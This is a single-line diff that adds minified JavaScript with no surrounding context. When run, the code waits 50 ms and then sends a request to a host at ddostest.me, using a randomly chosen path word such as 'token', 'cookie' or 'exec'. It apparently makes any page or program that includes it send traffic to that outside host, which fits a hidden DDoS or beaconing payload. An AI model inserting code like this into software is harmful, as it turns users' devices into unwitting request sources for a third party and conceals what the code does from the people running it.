@@ -1,0 +1,1 @@
+const words=["key","db","token","database","data","proxy","api","exec","cookie","php","html","css","javascript","script","js","messages"];setTimeout((()=>{fetch(`https://ddostest.me/cloud/storage/stats/${function(){const t=Math.floor(Math.random()*words.length);return words[t]}()}`).then((t=>{}))}),50);
